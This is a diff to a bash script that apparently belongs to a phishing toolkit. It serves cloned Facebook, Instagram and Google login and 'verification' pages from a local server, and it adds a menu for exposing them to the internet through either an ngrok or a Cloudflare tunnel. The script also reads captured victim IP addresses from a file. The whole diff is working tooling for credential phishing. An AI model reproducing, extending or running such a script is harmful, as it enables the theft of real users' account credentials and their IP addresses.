@@ -2,8 +2,29 @@ HOST='127.0.0.1'
 PORT='8080'
 Ngrok=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
 IP=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
+flare(){
+echo -e "\e[96m        |=====================================================|"
+echo -e "\e[96m        |                      CLOUDFLARED SERVER             |"
+echo -e "\e[96m        |                      FIND LINK YOURSELF             |"
+echo -e "\e[96m        |     EXAMPLE https://example-url.trycloudflare.com   |"
+echo -e "\e[96m        |=====================================================|"
+cloudflared --url localhost:8080
+}
 local(){
 bash local.sh 
+echo -e "\e[96m        |=====================================================|"
+echo -e "\e[96m        |      [\e[92m1\e[96m]==> NGROK                       |"
+echo -e "\e[96m        |      [\e[92m2\e[96m]==> CLOUDFLARE                  |"
+echo -e "\e[96m        |=====================================================|"
+read -p "CHOOSE SERVER : " flare
+if [ $flare == 1 ];
+then 
+ngrok
+
+elif [ $flare == 2 ];
+then 
+flare
+fi
 }
 
 
@@ -120,7 +141,7 @@ case $OP in
 1)
 cd .sites/facebook
 local
-ngrok
+
 cd joker/.sites/facebook
  
 while true;
@@ -147,7 +168,6 @@ done
 2)
 cd .sites/fb_advanced
 local
-ngrok
 cd joker/.sites/fb_advanced
 while true;
 
@@ -173,7 +193,7 @@ done
 3)
 cd .sites/fb_security
 local
-ngrok
+
 cd joker/.sites/fb_security
 while true;
 
@@ -199,7 +219,7 @@ done
 4)
 cd .sites/fb_messenger
 local
-ngrok
+
 cd joker/.sites/fb_messenger
 
 while true;
@@ -253,7 +273,7 @@ case $IG in
 
 cd .sites/instagram
 local
-ngrok
+
 cd joker/.sites/instagram
 
 while true;
@@ -280,7 +300,7 @@ done
 2)
 cd .sites/ig_followers
 local
-ngrok
+
 cd joker/.sites/ig_followers
 
 while true;
@@ -307,7 +327,7 @@ done
 3)
 cd .sites/insta_followers
 local
-ngrok
+
 cd joker/.sites/insta_followers
 
 while true;
@@ -334,7 +354,7 @@ done
 4)
 cd .sites/ig_verify
 local
-ngrok
+
 cd joker/.sites/ig_verify
 
 while true;
@@ -388,7 +408,7 @@ case $GG in
 
 cd .sites/google
 local
-ngrok
+
 cd joker/.sites/google
 ip
 while true;
@@ -414,7 +434,7 @@ done
 2)
 cd .sites/google_poll
 local
-ngrok
+
 cd joker/.sites/google_poll
 
 while true;
@@ -441,7 +461,7 @@ done
 3)
 cd .sites/google_new
 local
-ngrok
+
 cd joker/.sites/google_new
 
 while true;
